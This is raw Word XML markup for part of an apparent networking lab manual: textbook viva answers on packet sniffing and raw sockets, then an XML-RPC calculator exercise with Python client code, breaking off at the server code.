        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Viva Questions </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="324BE499" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>1. What is packet sniffing?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="248D9C19" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:Packet sniffing is the process of capturing and analyzing data packets that travel through a computer network.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67AA2EBD" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>2. What is a raw socket?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06D009B1" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:A raw socket is a type of socket that provides direct access to network packets, allowing programmers to read and manipulate packet headers and data.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76107688" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>3. Why are administrator or root privileges required for raw sockets?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70A03830" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:Administrator privileges are required because raw sockets provide low-level access to network traffic, which can affect system security and privacy.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D988225" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>4. Which Python module is used for implementing raw sockets?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EC5B741" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:The socket module in Python is used to create and work with raw sockets.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32143572" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C532191" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>import socket</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C3B98A2" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>5. What is the main purpose of packet sniffing?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="055B5A58" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:Packet sniffing is used for network monitoring, troubleshooting, performance analysis, and security investigations.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CA58D21" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F111184" w14:textId="77777777" w:rsidR="00812B48" w:rsidRDefault="00812B48" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1623F672" w14:textId="3BBA2458" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Ex.No:5         </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CB22384" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00484FBF">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>SIMPLE CALCULATOR USING XMLRPC</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59097052" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Aim:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A26CCE2" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>To develop a simple calculator using xmlrpc in python.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D8EE4CD" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Introduction: XML-RPC:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DEC5921" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>XML-RPC is a protocol that uses XML to encode remote procedure calls (RPC) and HTTP as a transport mechanism, allowing a client to call functions on a remote server over a network.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F23F37F" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Algorithm:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="614124EE" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Client:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B32977A" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>1. Import xmlrpc.client and create a ServerProxy for http://localhost:8000/.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EE9F510" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>2. Loop a fixed number of times (e.g., 5).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="706B6D88" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>3. Prompt the user to input two numbers (a and b).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6455EB06" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>4. Call server functions (add, sub, mul, div, mod) via the proxy.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F261F51" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>5. Receive results from the server for each operation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="048C53FA" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>6. Print the results to the user.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="167E405D" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Server:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0477FF83" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>1. Import SimpleXMLRPCServer from xmlrpc.server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A920242" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>2. Define arithmetic functions: add, sub, mul, div, mod.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E6D6443" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>3. Create an XMLRPCServer object bound to localhost on port 8000.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65AC205A" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>4. Register each function with the server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1761F783" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>5. Print a message indicating the server is listening.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="246115C3" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>6. Start the server using serve_forever() to handle incoming client requests.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64F9B8FF" w14:textId="77777777" w:rsidR="00484FBF" w:rsidRDefault="00484FBF" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7ED877C6" w14:textId="77777777" w:rsidR="00484FBF" w:rsidRDefault="00484FBF" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7D0DD600" w14:textId="77777777" w:rsidR="00484FBF" w:rsidRDefault="00484FBF" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6A196BB5" w14:textId="77777777" w:rsidR="00484FBF" w:rsidRDefault="00484FBF" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="50E6161F" w14:textId="77777777" w:rsidR="00484FBF" w:rsidRDefault="00484FBF" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="54C0F069" w14:textId="77777777" w:rsidR="00484FBF" w:rsidRDefault="00484FBF" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4261838F" w14:textId="77777777" w:rsidR="00484FBF" w:rsidRDefault="00484FBF" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6794EFDC" w14:textId="77777777" w:rsidR="00484FBF" w:rsidRDefault="00484FBF" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3B8CA405" w14:textId="3200E66F" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Program Code:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D7D26EA" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Client:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="654AA357" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>import xmlrpc.client</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DEE2DA3" w14:textId="6C40C61A" w:rsidR="0094061E" w:rsidRDefault="00195F37" w:rsidP="00484FBF">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">          proxy= xmlrpc.client.ServerProxy('http://localhost:8000/')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="055975CC" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>for i in range(5):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5408D3B2" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    a=int(input("Enter a number:"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71AE4387" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    b=int(input("Enter b number:"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45619983" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    print("addition of given number is %d "%((proxy.add(a,b))))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C4B2003" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    print("sub of given number is %d "%((proxy.sub(a,b))))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="791802BB" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    print("mul of given number is %d "%((proxy.mul(a,b))))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="292DB280" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    print("div of given number is %d "%((proxy.div(a,b))))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5925A7FF" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    print("mod of given number is %d "% ((proxy.mod(a,b))))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14AAD721" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Server:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="790BB945" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>from xmlrpc.server import SimpleXMLRPCServer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51CF7351" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
